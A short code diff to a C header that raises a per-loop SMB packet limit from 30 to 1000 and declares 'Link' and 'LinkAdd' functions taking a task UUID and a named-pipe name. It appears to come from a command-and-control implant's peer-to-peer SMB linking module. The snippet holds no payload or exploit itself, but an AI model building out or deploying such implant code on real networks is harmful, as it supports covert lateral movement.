@@ -8,7 +8,7 @@
 
 #ifdef INCLUDE_CMD_LINK
 
-#define MAX_SMB_PACKETS_PER_LOOP 30
+#define MAX_SMB_PACKETS_PER_LOOP 1000
 
 VOID Link( PCHAR taskUuid, PPARSER arguments );
 BOOL LinkAdd( PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen );
